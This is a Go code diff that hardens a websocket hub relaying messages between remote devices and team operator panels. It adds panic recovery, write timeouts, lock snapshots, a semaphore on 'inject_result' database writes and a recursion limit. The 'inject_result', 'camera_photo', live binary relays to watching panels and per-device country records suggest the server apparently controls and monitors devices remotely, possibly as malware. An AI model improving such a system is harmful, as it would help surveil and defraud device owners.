@@ -70,7 +70,15 @@ func (h *Hub) AddDevice(d *DeviceConn) {
 	if h.OnDeviceConnect != nil {
 		var model, country string
 		db.DB.QueryRow("SELECT model, country FROM devices WHERE device_id = ?", d.ID).Scan(&model, &country)
-		go h.OnDeviceConnect(d.TeamID, d.ID, model, country)
+		teamID, deviceID, m, c := d.TeamID, d.ID, model, country
+		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					log.Printf("[WS] OnDeviceConnect panic: %v", r)
+				}
+			}()
+			h.OnDeviceConnect(teamID, deviceID, m, c)
+		}()
 	}
 }
 
@@ -119,28 +127,48 @@ func (h *Hub) RemovePanel(id string) {
 	h.mu.Unlock()
 }
 
+const wsWriteTimeout = 5 * time.Second
+
+// panelWrite writes to a panel with a deadline. Must be called with p.mu held.
+func panelWrite(p *PanelConn, mt int, data []byte) {
+	p.Conn.SetWriteDeadline(time.Now().Add(wsWriteTimeout))
+	p.Conn.WriteMessage(mt, data)
+	p.Conn.SetWriteDeadline(time.Time{})
+}
+
 func (h *Hub) NotifyPanels(teamID string, msg map[string]any) {
 	data, _ := json.Marshal(msg)
+	// Snapshot under RLock, write outside to avoid holding lock during I/O
 	h.mu.RLock()
-	defer h.mu.RUnlock()
+	targets := make([]*PanelConn, 0)
 	for _, p := range h.panels {
 		if p.TeamID == teamID {
-			p.mu.Lock()
-			p.Conn.WriteMessage(websocket.TextMessage, data)
-			p.mu.Unlock()
+			targets = append(targets, p)
 		}
+	}
+	h.mu.RUnlock()
+
+	for _, p := range targets {
+		p.mu.Lock()
+		panelWrite(p, websocket.TextMessage, data)
+		p.mu.Unlock()
 	}
 }
 
 func (h *Hub) RelayBinaryToWatchers(deviceID, deviceTeamID string, data []byte) {
 	h.mu.RLock()
-	defer h.mu.RUnlock()
+	targets := make([]*PanelConn, 0)
 	for _, p := range h.panels {
 		if p.Watching == deviceID && p.TeamID == deviceTeamID {
-			p.mu.Lock()
-			p.Conn.WriteMessage(websocket.BinaryMessage, data)
-			p.mu.Unlock()
+			targets = append(targets, p)
 		}
+	}
+	h.mu.RUnlock()
+
+	for _, p := range targets {
+		p.mu.Lock()
+		panelWrite(p, websocket.BinaryMessage, data)
+		p.mu.Unlock()
 	}
 }
 
@@ -295,7 +323,21 @@ func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+// injectSem limits concurrent inject_result DB writes to prevent goroutine explosion
+var injectSem = make(chan struct{}, 64)
+
 func handleDeviceMessage(dc *DeviceConn, msg map[string]any) {
+	handleDeviceMessageDepth(dc, msg, 0)
+}
+
+func handleDeviceMessageDepth(dc *DeviceConn, msg map[string]any, depth int) {
+	if depth > 1 {
+		return // prevent infinite recursion
+	}
+	handleDeviceMessageInner(dc, msg, depth)
+}
+
+func handleDeviceMessageInner(dc *DeviceConn, msg map[string]any, depth int) {
 	msgType, _ := msg["type"].(string)
 
 	switch msgType {
@@ -399,7 +441,15 @@ func handleDeviceMessage(dc *DeviceConn, msg map[string]any) {
 	case "inject_result":
 		msg["device_id"] = dc.ID
 		H.NotifyPanels(dc.TeamID, msg)
-		go saveInjectResult(dc.ID, dc.TeamID, msg)
+		select {
+		case injectSem <- struct{}{}:
+			go func(id, tid string, m map[string]any) {
+				defer func() { <-injectSem }()
+				saveInjectResult(id, tid, m)
+			}(dc.ID, dc.TeamID, msg)
+		default:
+			log.Printf("[WS] inject_result dropped (semaphore full)")
+		}
 
 	case "camera_photo":
 		msg["device_id"] = dc.ID
@@ -417,7 +467,7 @@ func handleDeviceMessage(dc *DeviceConn, msg map[string]any) {
 				msg[k] = v
 			}
 		}
-		handleDeviceMessage(dc, msg)
+		handleDeviceMessageDepth(dc, msg, depth+1)
 		return
 
 	default:
@@ -492,10 +542,15 @@ func HandlePanelWS(w http.ResponseWriter, r *http.Request) {
 			"height":    d.Height,
 		})
 	}
+	// Use mutex so concurrent NotifyPanels can't race with this write
+	pc.mu.Lock()
+	pc.Conn.SetWriteDeadline(time.Now().Add(wsWriteTimeout))
 	conn.WriteJSON(map[string]any{
 		"type":    "device_list",
 		"devices": deviceList,
 	})
+	pc.Conn.SetWriteDeadline(time.Time{})
+	pc.mu.Unlock()
 
 	for {
 		_, msg, err := conn.ReadMessage()
